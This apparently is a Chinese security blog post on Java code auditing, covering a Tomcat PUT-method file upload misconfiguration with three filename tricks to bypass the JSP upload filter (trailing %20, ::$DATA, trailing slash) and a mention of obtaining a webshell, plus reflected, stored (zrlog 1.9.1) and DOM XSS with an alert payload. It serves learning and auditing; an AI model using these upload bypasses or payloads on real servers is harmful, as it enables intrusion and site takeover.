+<p><img src="image-20220302140719178.png" alt="image-20220302140719178" loading="lazy"></p>
+<p>使用burp抓包，发现是一个GET请求</p>
+<p>将其改为PUT方法写入一个txt文件</p>
+<pre class="line-numbers language-html" data-language="html"><code class="language-html">PUT /1.txt HTTP/1.1
+..
+..
+ROBOTERH<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="image-20220302142703484.png" alt="image-20220302142703484" loading="lazy"></p>
+<p>返回状态码为<a target="_blank" rel="noopener" href="http://restful.p2hp.com/resources/http-status-codes/http-status-201-created">201</a>， 说明上传成功了</p>
+<p>写入一个jsp文件</p>
+<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">PUT &#x2F;2.jsp HTTP&#x2F;1.1
+..
+..
+&lt;%out.print(&quot;ROBOTERH&quot;);%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="image-20220302143017222.png" alt="image-20220302143017222" loading="lazy"></p>
+<p>返回的状态码为404，说明被过滤了，通过PUT方式上传文件，不能上传jsp后缀的文件</p>
+<p>绕过方法:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1.</span>Windows下不允许文件以空格结尾以<span class="token constant">PUT</span> <span class="token operator">/</span>a001<span class="token operator">.</span>jsp<span class="token operator">%</span><span class="token number">20</span> <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>上传到 Windows会被自动去掉末尾空格  
+<span class="token number">2.</span>Windows <span class="token constant">NTFS</span>流<span class="token constant">PUT</span> <span class="token operator">/</span>a001<span class="token operator">.</span><span class="token class-name static-context">jsp</span><span class="token operator">::</span><span class="token variable">$DATA</span> <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>  
+<span class="token number">3.</span> <span class="token operator">/</span>在文件名中是非法的，也会被去除（Linux<span class="token operator">/</span>Windows）<span class="token constant">PUT</span> <span class="token operator">/</span>a001<span class="token operator">.</span>jsp<span class="token operator">/</span> <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>测试:</p>
+<p><img src="image-20220302143456792.png" alt="image-20220302143456792" loading="lazy"></p>
+<p><img src="image-20220302143642624.png" alt="image-20220302143642624" loading="lazy"></p>
+<p><img src="image-20220302143707893.png" alt="image-20220302143707893" loading="lazy"></p>
+<p>在docker中的上传文件成功:</p>
+<p><img src="image-20220302143845118.png" alt="image-20220302143845118" loading="lazy"></p>
+<p>同样可以拿到webshell:</p>
+<p><img src="image-20220302144539707.png" alt="image-20220302144539707" loading="lazy"></p>
+<h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p>由于配置不当,将配置文件<code>conf/web.xml</code>中的<code>readonly</code>设置为了false,导致可以使用PUT方法上传文件,并且执行代码,但限制了jsp后缀的上传</p>
+<p>即当设置<code>readonly</code>为<code>false</code>的时候,我们可以通过PUT/DELETE进行文件操控</p>
+<hr>
+<p>Tomcat在处理请求的时候有两个默认的<code>Servlet</code>, (DefaultServlet和JspServlet)</p>
+<p>DefaultServlet:</p>
+<p><img src="image-20220302145323165.png" alt="image-20220302145323165" loading="lazy"></p>
+<p>JspServlet:</p>
+<p><img src="image-20220302145347813.png" alt="image-20220302145347813" loading="lazy"></p>
+<p>Mapping:</p>
+<p><img src="image-20220302145854309.png" alt="image-20220302145854309" loading="lazy"></p>
+<p>可以从Mapping中看出,JspServlet只处理后缀为<code>.jsp, .jspx</code>的请求,其他请求使用DafaultServlet处理</p>
+<p>所以不能上传<code>jsp</code>文件,就是因为这个原因</p>
+<p>实现一个Servlet需要继承HttpServlet, 查看HttpServlet中的doPut方法</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPut</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>readOnly<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">sendNotAllowed</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">String</span> path <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getRelativePath</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">WebResource</span> resource <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>resources<span class="token punctuation">.</span><span class="token function">getResource</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">DefaultServlet<span class="token punctuation">.</span>Range</span> range <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">parseContentRange</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>range <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token class-name">Object</span> resourceInputStream <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+
+            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>range <span class="token operator">==</span> IGNORE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                    resourceInputStream <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+                    <span class="token class-name">File</span> contentFile <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">executePartialPut</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> range<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    resourceInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>contentFile<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span>
+
+                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>resources<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">InputStream</span><span class="token punctuation">)</span>resourceInputStream<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span>resource<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                        resp<span class="token punctuation">.</span><span class="token function">setStatus</span><span class="token punctuation">(</span><span class="token number">204</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+                        resp<span class="token punctuation">.</span><span class="token function">setStatus</span><span class="token punctuation">(</span><span class="token number">201</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">&#125;</span>
+                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+                    resp<span class="token punctuation">.</span><span class="token function">sendError</span><span class="token punctuation">(</span><span class="token number">409</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span>
+            <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>resourceInputStream <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+                        <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">InputStream</span><span class="token punctuation">)</span>resourceInputStream<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var13<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                    <span class="token punctuation">&#125;</span>
+                <span class="token punctuation">&#125;</span>
+
+            <span class="token punctuation">&#125;</span>
+
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>其中上传文件成功的时候返回的状态码是201,可以定位于if语句</p>
+<p><img src="image-20220302160918254.png" alt="image-20220302160918254" loading="lazy"></p>
+<p>其上面的path就是PUT请求后面接的URI</p>
+<p>进入source.write方法:</p>
+<p><img src="image-20220302161216763.png" alt="image-20220302161216763" loading="lazy"></p>
+<p>进入main.write方法:</p>
+<p><img src="image-20220302162730473.png" alt="image-20220302162730473" loading="lazy"></p>
+<p>进入file方法:</p>
+<p><img src="image-20220302162956892.png" alt="image-20220302162956892" loading="lazy"></p>
+<p>file对象在实例化的过程中会处理掉最后的<code>/</code>和多余的<code>/</code>, 之后就可以达到上传的目的</p>
+<h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><h5 id="审计策略"><a href="#审计策略" class="headerlink" title="审计策略"></a>审计策略</h5><ol>
+<li>收集输入点, 输出点</li>
+<li>查看输入, 输出点的上下文环境</li>
+<li>判断是否对输入, 输出做出过滤和防御</li>
+</ol>
+<h5 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h5><p>实例:</p>
+<p><img src="image-20220302165457421.png" alt="image-20220302165457421" loading="lazy"></p>
+<p>这个JSP代码会将GET传参的变量input输出到前端中</p>
+<p>而且并没有过input参数进行任何过滤操作</p>
+<p>正常:</p>
+<p><img src="image-20220302165733212.png" alt="image-20220302165733212" loading="lazy"></p>
+<p>不正常: <code>?input=&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<p><img src="image-20220302165835386.png" alt="image-20220302165835386" loading="lazy"></p>
+<h5 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h5><p>挖掘方式:</p>
+<ol>
+<li>黑白盒结合</li>
+<li>通过功能点判断</li>
+</ol>
+<h6 id="输入点"><a href="#输入点" class="headerlink" title="输入点"></a>输入点</h6><p><a target="_blank" rel="noopener" href="http://dl.zrlog.com/release/zrlog-1.9.1-cd87f93-release.war">zrlog-1.9.1下载</a></p>
+<p>漏洞点在网站设置-基本信息-网站标题位置，我们输入XSS-payload，点击提交：</p>
+<p><img src="image-20220303202842846.png" alt="image-20220303202842846" loading="lazy"></p>
+<p>如果访问该网站，就会触发</p>
+<p><img src="image-20220303202936780.png" alt="image-20220303202936780" loading="lazy"></p>
+<p>通过抓包</p>
+<p><img src="image-20220303203405588.png" alt="image-20220303203405588" loading="lazy"></p>
+<p>明白是在<code>/api/admin/website/update</code>将危险payload写入了数据库中，所以每次访问网站的时候都会被XSS攻击一次</p>
+<h6 id="审计代码"><a href="#审计代码" class="headerlink" title="审计代码"></a>审计代码</h6><p>在<code>WEB-INF/web.xml</code>中</p>
+<p><img src="image-20220303203933794.png" alt="image-20220303203933794" loading="lazy"></p>
+<p>其访问控制是使用<code>com.zrlog.web.config.ZrLogConfig</code>进行访问控制</p>
+<p>可以查看到路由信息</p>
+<p><img src="image-20220303204239668.png" alt="image-20220303204239668" loading="lazy"></p>
+<p>跟进<code>AdminRoutes</code></p>
+<p><img src="image-20220303204352987.png" alt="image-20220303204352987" loading="lazy"></p>
+<p>发现对应路由的源码位于<code>WebSiteController</code>类中</p>
+<p><img src="image-20220303204803948.png" alt="image-20220303204803948" loading="lazy"></p>
+<p>我们可以明白，update方法，将HTTP传送来的数据保存在<code>requestMap</code>对象中，然后通过<code>WebSite</code>的<code>updateByKV</code>方法与数据库进行交互更新，跟进<code>WebSite</code></p>
+<p><img src="image-20220303210206260.png" alt="image-20220303210206260" loading="lazy">    </p>
+<p>很明显，并没有做出任何的过滤操作就进行update操作了</p>
+<p>我们再次查看网站标题输出的代码(jsp)</p>
+<p><img src="image-20220303210851864.png" alt="image-20220303210851864" loading="lazy"></p>
+<p>同样没有做出任何的过滤</p>
+<h5 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h5><p><img src="image-20220303215513035.png" alt="image-20220303215513035" loading="lazy"></p>
+<p>通过访问</p>
+<p><img src="image-20220303215534017.png" alt="image-20220303215534017" loading="lazy"></p>
+<p>DOM常见的输入，输出点：</p>
+<p><img src="image-20220303215611289.png" alt="image-20220303215611289" loading="lazy"></p>
+</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="Donate" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I'm so cute. Please give me money.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/B01E5F9A0F70645FFD7D980FB6243619.jpg"><img loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/B01E5F9A0F70645FFD7D980FB6243619.jpg" alt="支付宝" title="支付宝"></a><div><span style="color:#00A3EE"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-alipay-line"></use></svg></span></div></div><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/D4AD9FA7BDA95604D2919F414577B0BA.png"><img loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/D4AD9FA7BDA95604D2919F414577B0BA.png" alt="QQ 支付" title="QQ 支付"></a><div><span style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></span></div></div><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/E8775427D2C8BC65C9AC73AE4CE5A3D8.jpg"><img loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/E8775427D2C8BC65C9AC73AE4CE5A3D8.jpg" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>RoboTerh</li><li class="post-copyright-link"><strong>Post link: </strong><a href="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/" title="Java代码审计(二)">https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> unless otherwise stated.</li></ul><script>document.addEventListener('copy', function (event) {
+  const clipboardData = event.clipboardData || window.clipboardData;
+  if (!clipboardData) { return; }
+  const text = window.getSelection().toString();
+  if (text) {
+    event.preventDefault();
+    clipboardData.setData('text/plain', text + '\n\nPost author: RoboTerh\nPost link: https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/\nCopyright Notice: All articles in this blog are licensed under CC BY-NC-SA 4.0 unless otherwise stated.');
+  }
+});</script></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2022/01/18/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun/" rel="prev" title="\[CISCN2019 华北赛区 Day1 Web2\]ikun"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">\[CISCN2019 华北赛区 Day1 Web2\]ikun</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2022/01/11/python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E4%B8%80/" rel="next" title="python核心编程读书笔记(一)"><span class="post-nav-text">python核心编程读书笔记(一)</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>要不要和我说些什么？</span><br></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2022 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> RoboTerh</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v5.4.0</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.7.0</span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></div></body></html>
